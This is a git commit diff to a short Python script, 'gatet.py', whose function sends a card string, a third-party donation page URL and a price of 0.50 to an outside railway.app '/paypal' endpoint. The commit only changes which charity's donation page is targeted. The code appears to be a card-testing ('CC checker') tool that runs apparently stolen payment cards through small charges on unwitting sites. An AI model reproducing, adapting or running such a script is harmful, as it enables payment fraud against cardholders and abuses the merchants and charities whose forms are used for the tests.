493c2cc816e88e4d22ea924f2be48800df4fc851
dfof1298-prog <dfof1298@gmail.com>
2026-04-17 19:30:14 +0200

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://keithalbee.com/take-a-seat/"
+	urll="https://arukahhouse.net/donate/"
 	price="0.50"
 	res=requests.get(f'http://pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
